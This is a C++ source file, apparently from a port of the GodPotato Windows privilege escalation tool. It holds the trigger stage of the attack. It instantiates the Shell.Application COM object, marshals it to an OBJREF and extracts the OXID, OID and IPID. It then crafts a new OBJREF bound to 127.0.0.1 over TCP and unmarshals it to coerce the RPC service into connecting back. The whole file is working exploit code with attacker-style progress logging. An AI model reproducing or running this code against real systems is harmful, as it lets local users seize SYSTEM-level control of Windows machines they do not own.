#include "trigger.h"

#include <algorithm>
#include <cstring>

#include "ctx.h"
#include "istream.h"
#include "objref.h"

namespace {

// CLSID_Shell.Application: a well-known local server object whose marshaled
// OBJREF carries an OXID that rpcss has actually registered.
const CLSID kClsidShellApplication =
    {0x13709620, 0xC279, 0x11CE, {0xA4, 0x9E, 0x44, 0x45, 0x53, 0x54, 0x00, 0x00}};

const IID kIidIUnknown = {0x00000000, 0x0000, 0x0000, {0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}};

bool ReadWholeStream(IStream* stream, std::vector<uint8_t>& data) {
    HGLOBAL global = nullptr;
    if (FAILED(GetHGlobalFromStream(stream, &global)) || !global) return false;

    SIZE_T size = GlobalSize(global);
    if (size == 0) return false;
    void* memory = GlobalLock(global);
    if (!memory) return false;
    data.assign(static_cast<uint8_t*>(memory), static_cast<uint8_t*>(memory) + size);
    GlobalUnlock(global);
    return true;
}

// Same trick as GodPotato's CreateObjrefMoniker + IMoniker::GetDisplayName:
// the resulting "objref:<base64>" string contains a fully marshaled OBJREF.
bool ObjRefFromMoniker(IUnknown* unknown, std::vector<uint8_t>& data) {
    IBindCtx* bindContext = nullptr;
    IMoniker* moniker = nullptr;
    LPOLESTR displayName = nullptr;

    bool ok = false;
    if (SUCCEEDED(CreateBindCtx(0, &bindContext)) &&
        SUCCEEDED(CreateObjrefMoniker(unknown, &moniker)) &&
        SUCCEEDED(moniker->GetDisplayName(bindContext, nullptr, &displayName)) && displayName) {
        std::wstring text(displayName);
        if (text.compare(0, 7, L"objref:") == 0) text.erase(0, 7);
        text.erase(std::remove(text.begin(), text.end(), L':'), text.end());

        std::string ascii;
        ascii.reserve(text.size());
        for (wchar_t c : text) {
            if (c < 0x80) ascii.push_back(static_cast<char>(c));
        }
        data = gpBase64Decode(ascii);
        ok = !data.empty();
    }

    if (displayName) CoTaskMemFree(displayName);
    if (moniker) moniker->Release();
    if (bindContext) bindContext->Release();
    return ok;
}

bool ObjRefFromMarshal(IUnknown* unknown, std::vector<uint8_t>& data) {
    IStream* stream = nullptr;
    if (FAILED(CreateStreamOnHGlobal(nullptr, TRUE, &stream))) return false;

    HRESULT hr = CoMarshalInterface(stream, IID_IUnknown, unknown, MSHCTX_LOCAL, nullptr,
                                    MSHLFLAGS_TABLESTRONG);
    bool ok = false;
    if (SUCCEEDED(hr)) {
        ok = ReadWholeStream(stream, data);
    }
    stream->Release();
    return ok;
}

IUnknown* CreateLocalComObject() {
    const CLSID candidates[] = {
        kClsidShellApplication,
        // CLSID_ShellLink (in-proc fallback).
        {0x00021401, 0x0000, 0x0000, {0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}},
    };

    for (const CLSID& clsid : candidates) {
        IUnknown* unknown = nullptr;
        HRESULT hr = CoCreateInstance(clsid, nullptr, CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_SERVER,
                                      kIidIUnknown, reinterpret_cast<void**>(&unknown));
        if (SUCCEEDED(hr) && unknown) return unknown;
    }
    return nullptr;
}

}  // namespace

int RunTrigger(GodPotatoContext& context, void** unmarshaled) {
    (void)context;
    if (unmarshaled) *unmarshaled = nullptr;

    IUnknown* unknown = CreateLocalComObject();
    if (!unknown) {
        gpLog("[!] CoCreateInstance failed, Win32Error:%lu", GetLastError());
        return -1;
    }

    std::vector<uint8_t> raw;
    if (!ObjRefFromMoniker(unknown, raw) && !ObjRefFromMarshal(unknown, raw)) {
        gpLog("[!] Cannot marshal the local COM object to an OBJREF");
        unknown->Release();
        return -1;
    }
    unknown->Release();

    gp::ParsedObjRef parsed;
    if (!gp::ParseObjRef(raw, parsed) || !parsed.hasStandard) {
        gpLog("[!] Cannot parse the marshaled OBJREF");
        return -1;
    }

    gpLog("[*] DCOM obj OXID: 0x%llx",
          static_cast<unsigned long long>(parsed.standard.oxid));
    gpLog("[*] DCOM obj OID: 0x%llx",
          static_cast<unsigned long long>(parsed.standard.oid));

    char ipidText[64] = {};
    const uint8_t* ipid = parsed.standard.ipid;
    snprintf(ipidText, sizeof(ipidText),
             "%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
             ipid[3], ipid[2], ipid[1], ipid[0], ipid[5], ipid[4], ipid[7], ipid[6],
             ipid[8], ipid[9], ipid[10], ipid[11], ipid[12], ipid[13], ipid[14], ipid[15]);
    gpLog("[*] DCOM obj IPID: %s", ipidText);
    gpLog("[*] DCOM obj Flags: 0x%x", parsed.standard.flags);
    gpLog("[*] DCOM obj PublicRefs: 0x%x", parsed.standard.publicRefs);

    gp::ObjRefStandard standard;
    standard.flags = 0;
    standard.publicRefs = 1;
    standard.oxid = parsed.standard.oxid;
    standard.oid = parsed.standard.oid;
    memcpy(standard.ipid, parsed.standard.ipid, sizeof(standard.ipid));

    std::vector<uint8_t> crafted = gp::BuildObjRef(parsed.iid, standard, gp::TowerProtocol::TCP, "127.0.0.1");
    gpLog("[*] Marshal Object bytes len: %llu", static_cast<unsigned long long>(crafted.size()));

    auto* stream = new gp::MemoryIStream(crafted.data(), crafted.size());
    void* ppv = nullptr;
    gpLog("[*] UnMarshal Object");
    HRESULT hr = CoUnmarshalInterface(stream, IID_IUnknown, &ppv);
    stream->Release();

    if (unmarshaled && SUCCEEDED(hr)) *unmarshaled = ppv;
    return static_cast<int>(hr);
}
